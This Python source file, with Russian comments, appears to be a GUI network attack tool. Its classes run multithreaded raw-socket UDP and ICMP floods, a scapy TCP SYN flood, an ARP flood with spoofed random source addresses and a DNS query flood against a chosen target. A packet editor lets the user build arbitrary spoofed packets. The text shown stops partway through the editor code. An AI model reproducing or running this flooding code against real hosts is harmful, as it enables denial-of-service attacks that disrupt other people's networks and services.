import tkinter as tk
from tkinter import *
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import time
import subprocess
import socket
import struct
import random
import os
import psutil
import platform
import ctypes
import sys
from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.l2 import ARP, Ether, STP, Dot1Q
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.dns import DNS, DNSQR

class RSattack:
    def __init__(self):
        self.running = False
        self.threads = []
        self.stats_lock = threading.Lock()
        self.stats = {
            'total_sent': 0,
            'current_pps': 0,
            'start_time': 0,
            'total_bytes': 0,
            'last_update': 0
        }
        self.udp_data_cache = {}
        
    def start_udp_attack(self, target_ip, port, packet_size, packet_count, continuous, interface, app_log):
        self.running = True
        self.stats = {
            'total_sent': 0,
            'current_pps': 0,
            'start_time': time.time(),
            'total_bytes': 0,
            'last_update': time.time()
        }
        
        try:
            source_ip = get_if_addr(interface)
            if not source_ip or source_ip == '0.0.0.0':
                source_ip = "192.168.1.1"
        except:
            source_ip = "192.168.1.1"
        
        data_size = max(0, packet_size - 28)
        cache_key = f"{packet_size}_{port}"
        
        if cache_key not in self.udp_data_cache:
            self.udp_data_cache[cache_key] = {
                'data': os.urandom(data_size),
                'pseudo_header': self._create_udp_pseudo_header(source_ip, target_ip, port, data_size)
            }
        
        cached = self.udp_data_cache[cache_key]
        data = cached['data']
        pseudo_header_template = cached['pseudo_header']
        total_length = 28 + data_size
        
        if platform.system() == "Windows":
            num_threads = 8
        else:
            num_threads = 16
        
        app_log(f"UDP атака: {num_threads} потоков, размер: {packet_size} байт")
        app_log(f"Цель: {target_ip}:{port}")
        
        for i in range(num_threads):
            thread = threading.Thread(
                target=self._udp_raw_worker,
                args=(i, target_ip, port, total_length, packet_count, continuous, 
                      interface, source_ip, data, pseudo_header_template, app_log),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
        
        stats_thread = threading.Thread(target=self._stats_worker, daemon=True)
        stats_thread.start()
        self.threads.append(stats_thread)
        
        return True
    
    def start_icmp_attack(self, target_ip, packet_size, packet_count, continuous, interface, app_log):
        self.running = True
        self.stats = {
            'total_sent': 0,
            'current_pps': 0,
            'start_time': time.time(),
            'total_bytes': 0,
            'last_update': time.time()
        }
        
        try:
            source_ip = get_if_addr(interface)
            if not source_ip or source_ip == '0.0.0.0':
                source_ip = "192.168.1.1"
        except:
            source_ip = "192.168.1.1"
        
        if platform.system() == "Windows":
            num_threads = 8
        else:
            num_threads = 16
        
        icmp_data = b'X' * max(0, packet_size - 28)
        
        app_log(f"ICMP атака: {num_threads} потоков, размер: {packet_size} байт")
        app_log(f"Цель: {target_ip}")
        
        # Создаем рабочие потоки
        for i in range(num_threads):
            thread = threading.Thread(
                target=self._icmp_raw_worker,
                args=(i, target_ip, packet_count, continuous, interface, source_ip, icmp_data, app_log),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
        
        # Поток для статистики
        stats_thread = threading.Thread(target=self._stats_worker, daemon=True)
        stats_thread.start()
        self.threads.append(stats_thread)
        
        return True
    
    def _udp_raw_worker(self, thread_id, target_ip, port, total_length, total_count, 
                        continuous, interface, source_ip, data, pseudo_header_template, app_log):
        packets_sent = 0
        src_port_base = (thread_id * 1000) + 1024
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 * 1024 * 1024)
            
            if platform.system() == "Windows":
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 * 1024 * 1024)
            
            batch_size = 200
            
            while self.running and (continuous or packets_sent < total_count):
                batch_packets = []
                
                for i in range(batch_size):
                    if not continuous and packets_sent >= total_count:
                        break
                    
                    packet = self._create_udp_packet(
                        source_ip, target_ip, port,
                        total_length,
                        packets_sent,  # seq_num вместо src_port
                        src_port_base + (packets_sent % 1000),  # src_port как отдельный аргумент
                        data,
                        pseudo_header_template
                    )
                    batch_packets.append(packet)
                    packets_sent += 1
                
                # Отправка всей пачки
                try:
                    for packet in batch_packets:
                        sock.sendto(packet, (target_ip, 0))
                    
                    # Обновление статистики
                    with self.stats_lock:
                        self.stats['total_sent'] += len(batch_packets)
                        self.stats['total_bytes'] += sum(len(p) for p in batch_packets)
                        
                except Exception as e:
                    time.sleep(0.005)
                
                # Адаптивный контроль скорости
                if packets_sent % 10000 == 0:
                    time.sleep(0.0005)
                    
                # Логирование прогресса
                if packets_sent % 5000 == 0 and packets_sent > 0:
                    current_pps = 0
                    with self.stats_lock:
                        app_log(f"[UDP-{thread_id}] Отправлено: {packets_sent:,} | PPS: {current_pps:,}")
            
            sock.close()
            
        except Exception as e:
            app_log(f"[UDP-{thread_id}] Ошибка: {str(e)[:80]}")
    
    def _icmp_raw_worker(self, thread_id, target_ip, total_count, continuous, 
                         interface, source_ip, icmp_data, app_log):
        packets_sent = 0
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 * 1024 * 1024)
            
            batch_size = 150
            
            while self.running and (continuous or packets_sent < total_count):
                batch_packets = []
                
                for i in range(batch_size):
                    if not continuous and packets_sent >= total_count:
                        break
                    
                    packet = self._create_icmp_packet(source_ip, target_ip, packets_sent, icmp_data)
                    batch_packets.append(packet)
                    packets_sent += 1
                
                try:
                    for packet in batch_packets:
                        sock.sendto(packet, (target_ip, 0))
                    
                    with self.stats_lock:
                        self.stats['total_sent'] += len(batch_packets)
                        self.stats['total_bytes'] += sum(len(p) for p in batch_packets)
                        
                except Exception as e:
                    time.sleep(0.005)
                
                if packets_sent % 50000 == 0:
                    time.sleep(0.0005)
                    
                if packets_sent % 5000 == 0 and packets_sent > 0:
                    current_pps = 0
                    with self.stats_lock:
                        current_pps = self.stats['current_pps']
                    app_log(f"[ICMP-{thread_id}] Отправлено: {packets_sent:,} | PPS: {current_pps:,}")
            
            sock.close()
            
        except Exception as e:
            app_log(f"[ICMP-{thread_id}] Ошибка: {str(e)[:80]}")
    
    def _create_udp_pseudo_header(self, src_ip, dst_ip, dst_port, data_size):
        return struct.pack('!4s4sBBH',
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip),
            0, 17,  # Протокол UDP
            8 + data_size)
    
    def _create_udp_packet(self, src_ip, dst_ip, dst_port, total_length, seq_num, src_port, data, pseudo_header_template):
        # IP заголовок
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45, 0x00,                    # Версия/IHL, ToS
            total_length,                  # Total Length
            (seq_num >> 16) & 0xFFFF,      # Identification
            0x4000,                        # Flags/Fragment Offset
            64, 17, 0,                     # TTL, Protocol=UDP, Checksum=0
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip)
        )
        
        # UDP заголовок
        udp_header = struct.pack('!HHHH',
            src_port, dst_port,            # Source Port, Destination Port
            8 + len(data), 0               # Length, Checksum=0
        )
        
        # Контрольная сумма UDP
        udp_checksum = self._calculate_checksum_fast(pseudo_header_template + udp_header + data)
        udp_header = udp_header[:6] + struct.pack('H', udp_checksum)
        
        # Контрольная сумма IP
        ip_checksum = self._calculate_checksum_fast(ip_header)
        ip_header = ip_header[:10] + struct.pack('H', ip_checksum) + ip_header[12:]
        
        return ip_header + udp_header + data
    
    def _create_icmp_packet(self, src_ip, dst_ip, seq_num, data):
        total_length = 28 + len(data)
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
            0x45, 0x00,                    # Версия/IHL, ToS
            total_length,                  # Total Length
            (seq_num >> 16) & 0xFFFF,      # Identification
            0x4000,                        # Flags/Fragment Offset
            64, 1, 0,                      # TTL, Protocol=ICMP, Checksum=0
            socket.inet_aton(src_ip),
            socket.inet_aton(dst_ip)
        )
        
        icmp_header = struct.pack('!BBHHH',
            8, 0,                          # Type=8 (Echo), Code=0
            0,                             # Checksum=0
            seq_num & 0xFFFF, 1            # Identifier, Sequence Number
        )
        
        # Контрольная сумма ICMP
        icmp_checksum = self._calculate_checksum_fast(icmp_header + data)
        icmp_header = icmp_header[:2] + struct.pack('H', icmp_checksum) + icmp_header[4:]
        
        # Контрольная сумма IP
        ip_checksum = self._calculate_checksum_fast(ip_header)
        ip_header = ip_header[:10] + struct.pack('H', ip_checksum) + ip_header[12:]
        
        return ip_header + icmp_header + data
    
    def _calculate_checksum_fast(self, data):
        if len(data) % 2:
            data += b'\x00'
        
        s = 0
        mv = memoryview(data)
        for i in range(0, len(mv), 2):
            w = (mv[i] << 8) + mv[i+1]
            s += w
        
        s = (s & 0xffff) + (s >> 16)
        s = (s & 0xffff) + (s >> 16)
        
        return ~s & 0xffff
    
    def _stats_worker(self):
        last_time = time.time()
        last_count = 0
        
        while self.running:
            time.sleep(0.5)
            
            current_time = time.time()
            with self.stats_lock:
                current_count = self.stats['total_sent']
                
                time_diff = current_time - last_time
                if time_diff > 0:
                    pps = int((current_count - last_count) / time_diff)
                    self.stats['current_pps'] = pps
                
                last_time = current_time
                last_count = current_count
    
    def stop(self):
        """Остановка атаки"""
        self.running = False
        
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=0.5)
        self.threads.clear()
        
        return self.stats.copy()

class Sattack:
    
    def __init__(self):
        self.running = False
        self.threads = []
        self.stats_lock = threading.Lock()
        self.stats = {
            'total_sent': 0,
            'start_time': 0,
            'total_bytes': 0
        }
    
    def start_tcp_attack(self, target_ip, port, packet_size, packet_count, continuous, interface, app_log):
        self.running = True
        self.stats = {
            'total_sent': 0,
            'start_time': time.time(),
            'total_bytes': 0
        }
        
        num_threads = min(4, os.cpu_count() or 2)
        app_log(f"TCP атака: {num_threads} потоков")
        app_log(f"Цель: {target_ip}:{port}")
        
        for i in range(num_threads):
            thread = threading.Thread(
                target=self._tcp_scapy_worker,
                args=(i, target_ip, port, packet_size, packet_count, continuous, interface, app_log),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
        
        return True
    
    def start_arp_attack(self, target_ip, packet_count, continuous, interface, app_log):
        self.running = True
        self.stats = {
            'total_sent': 0,
            'start_time': time.time(),
            'total_bytes': 0
        }
        
        num_threads = min(4, os.cpu_count() or 2)
        app_log(f"ARP атака: {num_threads} потоков")
        app_log(f"Цель: {target_ip}")
        
        for i in range(num_threads):
            thread = threading.Thread(
                target=self._arp_scapy_worker,
                args=(i, target_ip, packet_count, continuous, interface, app_log),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
        
        return True
    
    def start_dns_attack(self, target_ip, packet_count, continuous, interface, app_log):
        self.running = True
        self.stats = {
            'total_sent': 0,
            'start_time': time.time(),
            'total_bytes': 0
        }
        
        num_threads = min(4, os.cpu_count() or 2)
        app_log(f"DNS атака: {num_threads} потоков")
        app_log(f"Цель: {target_ip}:53")
        
        for i in range(num_threads):
            thread = threading.Thread(
                target=self._dns_scapy_worker,
                args=(i, target_ip, packet_count, continuous, interface, app_log),
                daemon=True
            )
            thread.start()
            self.threads.append(thread)
        
        return True
    
    def _tcp_scapy_worker(self, thread_id, target_ip, port, packet_size, total_count, continuous, interface, app_log):
        sent = 0
        payload_size = max(0, packet_size - 40)
        
        while self.running and (continuous or sent < total_count):
            try:
                packet = IP(dst=target_ip)/TCP(
                    sport=random.randint(1024, 65535),
                    dport=port,
                    flags="S",
                    seq=random.randint(1, 4294967295)
                )
                
                if payload_size > 0:
                    packet = packet/Raw(load=os.urandom(payload_size))
                
                send(packet, verbose=0)
                sent += 1
                
                with self.stats_lock:
                    self.stats['total_sent'] += 1
                    self.stats['total_bytes'] += len(packet)
                
            except Exception as e:
                time.sleep(0.1)
        
    
    def _arp_scapy_worker(self, thread_id, target_ip, total_count, continuous, interface, app_log):
        sent = 0
        
        while self.running and (continuous or sent < total_count):
            try:
                packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                    op=1,  # ARP Request
                    pdst=target_ip,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    psrc=".".join(str(random.randint(1, 254)) for _ in range(4)),
                    hwsrc="%02x:%02x:%02x:%02x:%02x:%02x" % (
                        random.randint(0, 255),
                        random.randint(0, 255),
                        random.randint(0, 255),
                        random.randint(0, 255),
                        random.randint(0, 255),
                        random.randint(0, 255)
                    )
                )
                
                sendp(packet, iface=interface, verbose=0)
                sent += 1
                
                with self.stats_lock:
                    self.stats['total_sent'] += 1
                    self.stats['total_bytes'] += len(packet)
                
                if sent % 500 == 0:
                    app_log(f"[ARP-{thread_id}] Отправлено: {sent:,}")
                    
            except Exception as e:
                app_log(f"[ARP-{thread_id}] Ошибка: {str(e)[:80]}")
                time.sleep(0.1)
        
        app_log(f"[ARP-{thread_id}] Завершено: {sent:,} пакетов")
    
    def _dns_scapy_worker(self, thread_id, target_ip, total_count, continuous, interface, app_log):
        sent = 0
        domains = ["example.com", "google.com", "yandex.ru", "mail.ru", "github.com"]
        
        while self.running and (continuous or sent < total_count):
            try:
                packet = IP(dst=target_ip)/UDP(
                    sport=random.randint(1024, 65535),
                    dport=53
                )/DNS(
                    rd=1,
                    qd=DNSQR(qname=random.choice(domains))
                )
                
                send(packet, verbose=0)
                sent += 1
                
                with self.stats_lock:
                    self.stats['total_sent'] += 1
                    self.stats['total_bytes'] += len(packet)
                
                if sent % 500 == 0:
                    app_log(f"[DNS-{thread_id}] Отправлено: {sent:,}")
                    
            except Exception as e:
                app_log(f"[DNS-{thread_id}] Ошибка: {str(e)[:80]}")
                time.sleep(0.1)
        
        app_log(f"[DNS-{thread_id}] Завершено: {sent:,} пакетов")
    
    def stop(self):
        """Остановка атаки"""
        self.running = False
        
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=0.5)
        self.threads.clear()
        
        return self.stats.copy()

class Theme:
    def __init__(self, root):
        self.root = root
        self.current_theme = "dark"
        self.setup_themes()
        
    def setup_themes(self):
        self.themes = {
            "light": {
                "primary_bg": "#f9fafb",      # Фон основного окна (светло-серый)
                "secondary_bg": "#ffffff",     # Фон второстепенных панелей (белый)
                "primary_fg": "#1f2937",       # Основной текст (тёмно-серый)
                "secondary_fg": "#6b7280",     # Вторичный текст (серый)
                "accent": "#6b7280",           # Акцентный цвет (серый, вместо синего)
                "success": "#10b981",          # Успех (зелёный)
                "warning": "#f59e0b",          # Предупреждение (оранжевый)
                "danger": "#ef4444",           # Ошибка (красный)
                "border": "#e5e7eb",           # Границы (светло-серый)
                "input_bg": "#ffffff",         # Фон полей ввода (белый)
                "input_fg": "#1f2937",         # Текст в полях ввода
                "button_bg": "#4b5563",        # Фон кнопок (тёмно-серый)
                "button_fg": "#ffffff",        # Текст кнопок
                "tree_bg": "#ffffff",          # Фон дерева
                "tree_fg": "#1f2937",          # Текст дерева
                "tree_selected": "#d1d5db",    # Выбранный элемент дерева
                "text_bg": "#ffffff",          # Фон текстового поля
                "text_fg": "#1f2937",          # Текст в текстовом поле
                "window_bg": "#f9fafb",        # Фон главного окна
                "scrollbar_bg": "#d1d5db",     # Цвет ползунка скроллбара
                "scrollbar_trough": "#f3f4f6", # Цвет желоба скроллбара
                "scrollbar_arrow": "#6b7280"   # Цвет стрелок скроллбара
            },
            "dark": {
                "primary_bg": "#111111",       # Фон основного окна (чёрный)
                "secondary_bg": "#1e1e1e",     # Фон второстепенных панелей (тёмно-серый)
                "primary_fg": "#e5e5e5",       # Основной текст (светло-серый)
                "secondary_fg": "#a0a0a0",     # Вторичный текст (серый)
                "accent": "#808080",           # Акцентный цвет (серый)
                "success": "#10b981",          # Успех (зелёный)
                "warning": "#f59e0b",          # Предупреждение (оранжевый)
                "danger": "#ef4444",           # Ошибка (красный)
                "border": "#333333",           # Границы (тёмно-серый)
                "input_bg": "#1e1e1e",         # Фон полей ввода
                "input_fg": "#e5e5e5",         # Текст в полях ввода
                "button_bg": "#333333",        # Фон кнопок
                "button_fg": "#ffffff",        # Текст кнопок
                "tree_bg": "#1e1e1e",          # Фон дерева
                "tree_fg": "#e5e5e5",          # Текст дерева
                "tree_selected": "#4b5563",    # Выбранный элемент дерева
                "text_bg": "#1e1e1e",          # Фон текстового поля
                "text_fg": "#e5e5e5",          # Текст в текстовом поле
                "window_bg": "#111111",        # Фон главного окна
                "scrollbar_bg": "#4b5563",     # Цвет ползунка скроллбара
                "scrollbar_trough": "#2d2d2d", # Цвет желоба скроллбара
                "scrollbar_arrow": "#a0a0a0"   # Цвет стрелок скроллбара
            }
        }
    
    def apply_theme(self, theme_name):
        if theme_name not in self.themes:
            return
        
        self.current_theme = theme_name
        theme = self.themes[theme_name]
        
        style = ttk.Style()
        style.theme_use('clam')
        
        # Настройка общих параметров стиля
        style.configure(".", 
                       background=theme["primary_bg"],
                       foreground=theme["primary_fg"],
                       fieldbackground=theme["input_bg"],
                       selectbackground=theme["accent"],
                       font=('Arial', 9))
        
        self.root.configure(bg=theme["window_bg"])
        # Устанавливаем палитру для tk виджетов
        self.root.tk_setPalette(
            background=theme["window_bg"],
            foreground=theme["primary_fg"],
            activeBackground=theme["accent"],
            activeForeground=theme["button_fg"]
        )
        
        # Настройка стилей для ttk виджетов
        style.configure("TFrame", background=theme["primary_bg"])
        style.configure("TLabel", background=theme["primary_bg"], foreground=theme["primary_fg"], font=('Arial', 9))
        style.configure("TLabelframe", background=theme["secondary_bg"], foreground=theme["primary_fg"])
        style.configure("TLabelframe.Label", background=theme["secondary_bg"], foreground=theme["primary_fg"], font=('Arial', 9))
        
        style.configure("TButton", 
                       background=theme["button_bg"],
                       foreground=theme["button_fg"],
                       focuscolor=theme["accent"],
                       padding=(6, 3), 
                       font=('Arial', 9),
                       wraplength=150)
        style.map("TButton",
                 background=[('active', theme["accent"]),
                           ('pressed', theme["accent"])])
        
        style.configure("TEntry",
                       fieldbackground=theme["input_bg"],
                       foreground=theme["input_fg"],
                       insertcolor=theme["input_fg"],
                       font=('Arial', 9))
        
        style.configure("TCombobox",
                       fieldbackground=theme["input_bg"],
                       foreground=theme["input_fg"],
                       background=theme["button_bg"],
                       font=('Arial', 9))
        
        style.configure("TCheckbutton",
                       background=theme["primary_bg"],
                       foreground=theme["primary_fg"])
        
        style.configure("TNotebook", background=theme["secondary_bg"])
        style.configure("TNotebook.Tab",
                       background=theme["secondary_bg"],
                       foreground=theme["secondary_fg"])
        style.map("TNotebook.Tab",
                 background=[('selected', theme["primary_bg"])],
                 foreground=[('selected', theme["primary_fg"])])
        
        style.configure("Treeview",
                       background=theme["tree_bg"],
                       foreground=theme["tree_fg"],
                       fieldbackground=theme["tree_bg"])
        style.map("Treeview", background=[('selected', theme["tree_selected"])])
        
        # Стилизация ttk скроллбара
        style.configure("TScrollbar",
                       background=theme["scrollbar_bg"],
                       troughcolor=theme["scrollbar_trough"],
                       arrowcolor=theme["scrollbar_arrow"])
        
        # Применяем тему ко всем виджетам, включая старые tk.Scrollbar
        self.apply_to_widgets(self.root, theme)
        
    def apply_to_widgets(self, widget, theme):
        try:
            widget_type = widget.winfo_class()
            
            if widget_type in ("Frame", "Labelframe", "LabelFrame"):
                widget.config(bg=theme["primary_bg"])
            elif widget_type == "Label":
                widget.config(bg=theme["primary_bg"], fg=theme["primary_fg"], font=('Arial', 9))
            elif widget_type == "Button":
                widget.config(bg=theme["button_bg"], fg=theme["button_fg"],
                            activebackground=theme["accent"], font=('Arial', 9),
                            padx=8, pady=3, wraplength=150)
            elif widget_type == "Entry":
                widget.config(bg=theme["input_bg"], fg=theme["input_fg"],
                            insertbackground=theme["input_fg"], font=('Arial', 9))
            elif widget_type == "Text":
                widget.config(bg=theme["text_bg"], fg=theme["text_fg"],
                            insertbackground=theme["text_fg"], font=('Arial', 9))
            elif widget_type == "Scrollbar":
                # Применяем настройки для tk.Scrollbar
                widget.config(bg=theme["scrollbar_bg"],
                            troughcolor=theme["scrollbar_trough"],
                            activebackground=theme["scrollbar_bg"])
            elif widget_type == "Listbox":
                widget.config(bg=theme["input_bg"], fg=theme["input_fg"], font=('Arial', 9))
            elif widget_type == "Canvas":
                widget.config(bg=theme["primary_bg"])
                
        except Exception:
            pass
        
        for child in widget.winfo_children():
            self.apply_to_widgets(child, theme)
            
class Editor:
    def __init__(self, parent, packet, callback):
        self.parent = parent
        self.packet = packet
        self.callback = callback
        self.edited_packet = None
        
        self.editor_window = tk.Toplevel(parent)
        self.editor_window.title("Редактор пакета")
        self.editor_window.geometry("900x700")
        self.editor_window.transient(parent)
        self.editor_window.grab_set()
        
        self.create_widgets()
        self.parse_packet()
        
    def create_widgets(self):
        main_frame = ttk.Frame(self.editor_window)
        main_frame.pack(fill='both', expand=True, padx=10, pady=10)

        info_frame = ttk.LabelFrame(main_frame, text="Информация о пакете")
        info_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(info_frame, text="Исходный пакет:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.original_info = ttk.Label(info_frame, text=self.packet.summary())
        self.original_info.grid(row=0, column=1, padx=5, pady=2, sticky='w')

        details_frame = ttk.LabelFrame(main_frame, text="Детали пакета")
        details_frame.pack(fill='x', padx=5, pady=5)
        
        self.packet_details = scrolledtext.ScrolledText(details_frame, height=8, wrap=tk.WORD)
        self.packet_details.pack(fill='both', expand=True, padx=5, pady=5)
        self.packet_details.config(state='normal')
        
        eth_frame = ttk.LabelFrame(main_frame, text="Ethernet Layer")
        eth_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(eth_frame, text="Source MAC:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.eth_src = ttk.Entry(eth_frame, width=20)
        self.eth_src.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(eth_frame, text="Dest MAC:").grid(row=0, column=2, padx=5, pady=2, sticky='w')
        self.eth_dst = ttk.Entry(eth_frame, width=20)
        self.eth_dst.grid(row=0, column=3, padx=5, pady=2, sticky='w')

        ip_frame = ttk.LabelFrame(main_frame, text="IP Layer")
        ip_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(ip_frame, text="Source IP:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.ip_src = ttk.Entry(ip_frame, width=20)
        self.ip_src.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(ip_frame, text="Dest IP:").grid(row=0, column=2, padx=5, pady=2, sticky='w')
        self.ip_dst = ttk.Entry(ip_frame, width=20)
        self.ip_dst.grid(row=0, column=3, padx=5, pady=2, sticky='w')
        
        ttk.Label(ip_frame, text="TTL:").grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.ip_ttl = ttk.Entry(ip_frame, width=10)
        self.ip_ttl.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        transport_frame = ttk.LabelFrame(main_frame, text="Transport Layer")
        transport_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(transport_frame, text="Protocol:").grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.transport_proto = ttk.Combobox(transport_frame, values=["TCP", "UDP", "ICMP", "RAW"], width=10)
        self.transport_proto.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(transport_frame, text="Source Port:").grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.src_port = ttk.Entry(transport_frame, width=10)
        self.src_port.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        
        ttk.Label(transport_frame, text="Dest Port:").grid(row=1, column=2, padx=5, pady=2, sticky='w')
        self.dst_port = ttk.Entry(transport_frame, width=10)
        self.dst_port.grid(row=1, column=3, padx=5, pady=2, sticky='w')

        tcp_flags_frame = ttk.Frame(transport_frame)
        tcp_flags_frame.grid(row=2, column=0, columnspan=4, pady=5)
        
        self.tcp_flags_vars = {}
        tcp_flags = ["FIN", "SYN", "RST", "PSH", "ACK", "URG", "ECE", "CWR"]
        for i, flag in enumerate(tcp_flags):
            self.tcp_flags_vars[flag] = tk.BooleanVar()
            ttk.Checkbutton(tcp_flags_frame, text=flag, variable=self.tcp_flags_vars[flag]).grid(
                row=0, column=i, padx=2, sticky='w')

        data_frame = ttk.LabelFrame(main_frame, text="Payload Data")
        data_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.payload_data = scrolledtext.ScrolledText(data_frame, height=10, wrap=tk.WORD)
        self.payload_data.pack(fill='both', expand=True, padx=5, pady=5)

        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        
        ttk.Button(button_frame, text="Применить изменения", 
                  command=self.apply_changes).pack(side='left', padx=5)
        ttk.Button(button_frame, text="Отмена", 
                  command=self.editor_window.destroy).pack(side='right', padx=5)
        
    def parse_packet(self):
        if self.packet.haslayer(Ether):
            self.eth_src.insert(0, self.packet[Ether].src)
            self.eth_dst.insert(0, self.packet[Ether].dst)
        
        if self.packet.haslayer(IP):
            self.ip_src.insert(0, self.packet[IP].src)
            self.ip_dst.insert(0, self.packet[IP].dst)
            self.ip_ttl.insert(0, str(self.packet[IP].ttl))
            
            if self.packet.haslayer(TCP):
                self.transport_proto.set("TCP")
                self.src_port.insert(0, str(self.packet[TCP].sport))
                self.dst_port.insert(0, str(self.packet[TCP].dport))

                flags = self.packet[TCP].flags
                self.tcp_flags_vars["FIN"].set(bool(flags & 0x01))
                self.tcp_flags_vars["SYN"].set(bool(flags & 0x02))
                self.tcp_flags_vars["RST"].set(bool(flags & 0x04))
                self.tcp_flags_vars["PSH"].set(bool(flags & 0x08))
                self.tcp_flags_vars["ACK"].set(bool(flags & 0x10))
                self.tcp_flags_vars["URG"].set(bool(flags & 0x20))
                self.tcp_flags_vars["ECE"].set(bool(flags & 0x40))
                self.tcp_flags_vars["CWR"].set(bool(flags & 0x80))
                
                if self.packet.haslayer(Raw):
                    try:
                        self.payload_data.insert('1.0', self.packet[Raw].load.hex())
                    except:
                        self.payload_data.insert('1.0', str(self.packet[Raw].load))
                    
            elif self.packet.haslayer(UDP):
                self.transport_proto.set("UDP")
                self.src_port.insert(0, str(self.packet[UDP].sport))
                self.dst_port.insert(0, str(self.packet[UDP].dport))
                
                if self.packet.haslayer(Raw):
                    try:
                        self.payload_data.insert('1.0', self.packet[Raw].load.hex())
                    except:
                        self.payload_data.insert('1.0', str(self.packet[Raw].load))
                    
            elif self.packet.haslayer(ICMP):
                self.transport_proto.set("ICMP")
            else:
                self.transport_proto.set("RAW")

        self.show_packet_details()
                
    def show_packet_details(self):
        details = "=== ДЕТАЛИ ПАКЕТА ===\n\n"
        
        if self.packet.haslayer(Ether):
            details += f"Ethernet:\n"
            details += f"  Source: {self.packet[Ether].src}\n"
            details += f"  Destination: {self.packet[Ether].dst}\n"
            details += f"  Type: {self.packet[Ether].type}\n\n"
        
        if self.packet.haslayer(IP):
            details += f"IP:\n"
            details += f"  Version: {self.packet[IP].version}\n"
            details += f"  Source: {self.packet[IP].src}\n"
            details += f"  Destination: {self.packet[IP].dst}\n"
            details += f"  TTL: {self.packet[IP].ttl}\n"
            details += f"  Protocol: {self.packet[IP].proto}\n\n"
            
        if self.packet.haslayer(TCP):
            details += f"TCP:\n"
            details += f"  Source Port: {self.packet[TCP].sport}\n"
            details += f"  Destination Port: {self.packet[TCP].dport}\n"
            details += f"  Flags: {self.packet[TCP].flags}\n"
            details += f"  Sequence: {self.packet[TCP].seq}\n"
            details += f"  Acknowledgment: {self.packet[TCP].ack}\n"
            details += f"  Window: {self.packet[TCP].window}\n\n"
            
        elif self.packet.haslayer(UDP):
            details += f"UDP:\n"
            details += f"  Source Port: {self.packet[UDP].sport}\n"
            details += f"  Destination Port: {self.packet[UDP].dport}\n"
            details += f"  Length: {self.packet[UDP].len}\n\n"
            
        elif self.packet.haslayer(ICMP):
            details += f"ICMP:\n"
            details += f"  Type: {self.packet[ICMP].type}\n"
            details += f"  Code: {self.packet[ICMP].code}\n\n"
            
        if self.packet.haslayer(Raw):
            details += f"Payload:\n"
            payload = self.packet[Raw].load
            details += f"  Length: {len(payload)} bytes\n"
            try:
                details += f"  Hex: {payload.hex()}\n"
                if len(payload) < 100:
                    try:
                        text = payload.decode('utf-8', errors='ignore')
                        if all(c.isprintable() or c in '\n\r\t' for c in text):
                            details += f"  Text: {text}\n"
                    except:
                        pass
            except:
                details += f"  Content: {str(payload)}\n"
        
        self.packet_details.insert('1.0', details)
        self.packet_details.config(state='disabled')
                
    def apply_changes(self):
        try:
            new_packet = self.create_modified_packet()
            self.edited_packet = new_packet
            self.callback(new_packet, True)
            self.editor_window.destroy()
            
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось создать пакет: {str(e)}")
    
    def create_modified_packet(self):
        new_packet = Ether()

        if self.eth_src.get():
            dst_mac = self.eth_dst.get() if self.eth_dst.get() else "ff:ff:ff:ff:ff:ff"
            new_packet = Ether(src=self.eth_src.get(), dst=dst_mac)

        if self.ip_src.get() and self.ip_dst.get():
            ip_packet = IP(src=self.ip_src.get(), dst=self.ip_dst.get())
            if self.ip_ttl.get():
                try:
                    ip_packet.ttl = int(self.ip_ttl.get())
                except:
                    pass
                    
            new_packet = new_packet / ip_packet

            proto = self.transport_proto.get()
            if proto == "TCP" and self.src_port.get() and self.dst_port.get():
                tcp_packet = TCP(sport=int(self.src_port.get()), dport=int(self.dst_port.get()))

                flags = 0
                if self.tcp_flags_vars["FIN"].get(): flags |= 0x01
                if self.tcp_flags_vars["SYN"].get(): flags |= 0x02
                if self.tcp_flags_vars["RST"].get(): flags |= 0x04
                if self.tcp_flags_vars["PSH"].get(): flags |= 0x08
                if self.tcp_flags_vars["ACK"].get(): flags |= 0x10
                if self.tcp_flags_vars["URG"].get(): flags |= 0x20
                if self.tcp_flags_vars["ECE"].get(): flags |= 0x40
